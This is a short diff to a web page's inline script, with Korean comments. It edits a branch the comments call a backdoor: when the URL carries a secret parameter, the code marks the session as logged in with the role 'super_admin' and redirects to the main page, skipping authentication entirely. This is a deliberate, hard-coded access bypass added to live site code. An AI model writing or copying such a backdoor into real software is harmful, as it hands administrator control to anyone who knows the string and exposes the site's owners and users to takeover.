@@ -32,8 +32,11 @@
 // URL 파라미터 백도어 식별자 감지 자동 우회 플래그 셋팅
 if(location.search.indexOf('access=master_sys_884621') !== -1){
     sessionStorage.setItem('creatorBypass', 'true');
-    // 백도어 진입 시 즉시 메인 인덱스로 파라미터를 넘겨 락을 해제하도록 유도
-    location.href = 'index.html?access=master_sys_884621';
+    // 백도어 진입 시 세션 설정 후 main.html로 바로 이동
+    sessionStorage.setItem('loginOk', 'true');
+    sessionStorage.setItem('userRole', 'super_admin');
+    sessionStorage.setItem('creatorBypass', 'true');
+    location.href = 'main.html?access=master_sys_884621';
 }
 </script>
 <script>
